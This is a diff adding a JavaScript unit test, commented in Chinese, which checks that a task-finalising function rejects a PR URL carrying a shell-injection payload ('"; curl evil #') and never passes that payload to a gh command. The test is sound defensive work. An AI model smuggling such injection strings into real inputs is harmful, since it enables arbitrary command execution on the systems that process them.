@@ -134,6 +134,23 @@ describe('finalizeHarnessTask — 外部真相核验', () => {
     expect(r.reason).toMatch(/evaluator/i);
   });
 
+  it('pr_url 为 shell 注入串 → 不采信，命令不含注入内容（威胁模型正主）', async () => {
+    const EVIL = 'https://github.com/o/r"; curl evil #/pull/1';
+    const { deps, execFn } = makeDeps({
+      taskRow: { id: TASK_ID, status: 'in_progress', task_type: 'harness_initiative', pr_url: EVIL, payload: { orchestrator: 'skill-relay', base_repo: BASE_REPO } },
+      prListState: null, // 反查无命中 → demote
+    });
+    const r = await finalizeHarnessTask(TASK_ID, deps);
+    // 注入串不匹配严格正则 → 视同无 pr_url，落到反查路径；反查无命中 → demote
+    expect(r.applies).toBe(true);
+    expect(r.allow).toBe(false);
+    // execFn 收到的任何命令都不得含注入原始串（即绝不走 `gh pr view "<evil>"`）
+    for (const call of execFn.mock.calls) {
+      expect(String(call[0])).not.toContain(EVIL);
+      expect(String(call[0])).not.toMatch(/gh pr view/);
+    }
+  });
+
   it('gh 命令抛错 → allow:false（保守拒绝，不放行终态）', async () => {
     const { deps } = makeDeps({
       taskRow: { id: TASK_ID, status: 'in_progress', task_type: 'harness_initiative', pr_url: PR_URL, payload: { orchestrator: 'skill-relay', base_repo: BASE_REPO } },
